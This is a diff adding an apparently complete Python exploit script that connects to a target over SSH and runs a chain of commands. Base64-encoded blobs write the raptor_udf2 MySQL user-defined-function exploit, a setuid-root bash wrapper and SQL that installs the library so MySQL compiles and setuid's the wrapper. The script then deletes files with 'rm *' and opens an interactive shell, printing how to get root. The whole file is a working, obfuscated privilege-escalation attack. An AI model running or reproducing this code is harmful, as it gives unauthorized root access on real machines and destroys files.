@@ -1,0 +1,61 @@
+#!/usr/bin/python
+
+import time
+import os
+import paramiko
+
+
+# Global network variables
+
+tg_ip = 'xxx.xxx.xxx.xxx'
+tg_port = port_number_here
+username = 'username_here'
+password = 'password_here'
+
+# Make our connection
+connection = paramiko.SSHClient()
+connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+connection.connect(tg_ip,port=tg_port,username=username,password=password,look_for_keys=False,allow_agent=False)
+
+# Function to execute our commands on the remote machine
+def do_command(command):
+    ssh_session = connection.get_transport().open_session()
+    if ssh_session.active:
+        ssh_session.exec_command(command)
+
+# A list containing 3 command pairs echo base64 file / unencode encoded file, code execution, &cleanup in a hackerish one liner
+commands = ["rm *","echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KIAplbnVtIEl0ZW1fcmVzdWx0IHtTVFJJTkdfUkVTVUxULCBSRUFMX1JFU1VMVCwgSU5UX1JFU1VMVCwgUk9XX1JFU1VMVH07CiAKdHlwZWRlZiBzdHJ1Y3Qgc3RfdWRmX2FyZ3Mgewp1bnNpZ25lZCBpbnQgYXJnX2NvdW50OyAvLyBudW1iZXIgb2YgYXJndW1lbnRzCmVudW0gSXRlbV9yZXN1bHQgKmFyZ190eXBlOyAvLyBwb2ludGVyIHRvIGl0ZW1fcmVzdWx0CmNoYXIgKiphcmdzOyAvLyBwb2ludGVyIHRvIGFyZ3VtZW50cwp1bnNpZ25lZCBsb25nICpsZW5ndGhzOyAvLyBsZW5ndGggb2Ygc3RyaW5nIGFyZ3MKY2hhciAqbWF5YmVfbnVsbDsgLy8gMSBmb3IgbWF5YmVfbnVsbCBhcmdzCn0gVURGX0FSR1M7CiAKdHlwZWRlZiBzdHJ1Y3Qgc3RfdWRmX2luaXQgewpjaGFyIG1heWJlX251bGw7IC8vIDEgaWYgZnVuYyBjYW4gcmV0dXJuIE5VTEwKdW5zaWduZWQgaW50IGRlY2ltYWxzOyAvLyBmb3IgcmVhbCBmdW5jdGlvbnMKdW5zaWduZWQgbG9uZyBtYXhfbGVuZ3RoOyAvLyBmb3Igc3RyaW5nIGZ1bmN0aW9ucwpjaGFyICpwdHI7IC8vIGZyZWUgcHRyIGZvciBmdW5jIGRhdGEKY2hhciBjb25zdF9pdGVtOyAvLyAwIGlmIHJlc3VsdCBpcyBjb25zdGFudAp9IFVERl9JTklUOwogCmludCBkb19zeXN0ZW0oVURGX0lOSVQgKmluaXRpZCwgVURGX0FSR1MgKmFyZ3MsIGNoYXIgKmlzX251bGwsIGNoYXIgKmVycm9yKQp7CmlmIChhcmdzLT5hcmdfY291bnQgIT0gMSkKcmV0dXJuKDApOwogCnN5c3RlbShhcmdzLT5hcmdzWzBdKTsKIApyZXR1cm4oMCk7Cn0KIApjaGFyIGRvX3N5c3RlbV9pbml0KFVERl9JTklUICppbml0aWQsIFVERl9BUkdTICphcmdzLCBjaGFyICptZXNzYWdlKQp7CnJldHVybigwKTsKfQo== > raptor_udf2.c.base64","cat raptor_udf2.c.base64 | base64 --decode > raptor_udf2.c","echo I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKaW50IG1haW4odm9pZCkKewogIHNldHVpZCgwKTsgc2V0Z2lkKDApOyBzeXN0ZW0oIi9iaW4vYmFzaCIpOwp9Cg= > setuid.c.base64","cat setuid.c.base64 | base64 --decode > setuid.c","echo dXNlIG15c3FsOwpkcm9wIHRhYmxlIGlmIGV4aXN0cyBmb287CmRyb3AgZnVuY3Rpb24gaWYgZXhpc3RzIGRvX3N5c3RlbTsKY3JlYXRlIHRhYmxlIGZvbyhsaW5lIGJsb2IpOwppbnNlcnQgaW50byBmb28gdmFsdWVzKGxvYWRfZmlsZSgnL2hvbWUvajBobi9yYXB0b3JfdWRmMi5zbycpKTsKc2VsZWN0ICogZnJvbSBmb28gaW50byBkdW1wZmlsZSAnL3Vzci9saWIvcmFwdG9yX3VkZjIuc28nOwpjcmVhdGUgZnVuY3Rpb24gZG9fc3lzdGVtIHJldHVybnMgaW50ZWdlciBzb25hbWUgJ3JhcHRvcl91ZGYyLnNvJzsKc2VsZWN0ICogZnJvbSBteXNxbC5mdW5jOwpzZWxlY3QgZG9fc3lzdGVtKCdnY2MgLW8gL2hvbWUvajBobi9zZXR1aWQgL2hvbWUvajBobi9zZXR1aWQuYycpOwpzZWxlY3QgZG9fc3lzdGVtKCdjaG1vZCB1K3MgL2hvbWUvajBobi9zZXR1aWQnKTsK > sql1.sql.base64","cat sql1.sql.base64 | base64 --decode > sql1.sql","echo dXNlIG15c3FsOwpkcm9wIHRhYmxlIGlmIGV4aXN0cyBmb287CmRyb3AgZnVuY3Rpb24gaWYgZXhpc3RzIGRvX3N5c3RlbTsKY3JlYXRlIHRhYmxlIGZvbyhsaW5lIGJsb2IpOwppbnNlcnQgaW50byBmb28gdmFsdWVzKGxvYWRfZmlsZSgnL2hvbWUvajBobi9yYXB0b3JfdWRmMi5zbycpKTsKY3JlYXRlIGZ1bmN0aW9uIGRvX3N5c3RlbSByZXR1cm5zIGludGVnZXIgc29uYW1lICdyYXB0b3JfdWRmMi5zbyc7CnNlbGVjdCAqIGZyb20gbXlzcWwuZnVuYzsKc2VsZWN0IGRvX3N5c3RlbSgnZ2NjIC1vIC9ob21lL2owaG4vc2V0dWlkIC9ob21lL2owaG4vc2V0dWlkLmMnKTsKc2VsZWN0IGRvX3N5c3RlbSgnY2htb2QgdStzIC9ob21lL2owaG4vc2V0dWlkJyk7Cg== > sql2.sql.base64","cat sql2.sql.base64 | base64 --decode > sql2.sql","rm *.base64","gcc -g -c raptor_udf2.c","gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc","if [[ -e /usr/lib/raptor_udf2.so ]]; then mysql -u root < sql2.sql; else mysql -u root < sql1.sql;fi","rm *.*"]
+
+
+# Iterate over the commands
+for command in commands:
+    do_command(command)
+
+
+
+# Open interactive (low priv) shell prompt
+
+channel = connection.get_transport().open_session()
+channel.get_pty()
+channel.invoke_shell()
+
+print 'to get root type: ./setuid'
+while True:
+    command = raw_input('$ ')
+    if command == 'exit':
+        break
+
+    channel.send(command + "\n")
+
+    while True:
+        if channel.recv_ready():
+            output = channel.recv(1024)
+            print output
+        else:
+            time.sleep(0.5)
+            if not(channel.recv_ready()):
+                break
+
+# Close Connection
+connection.close()
+
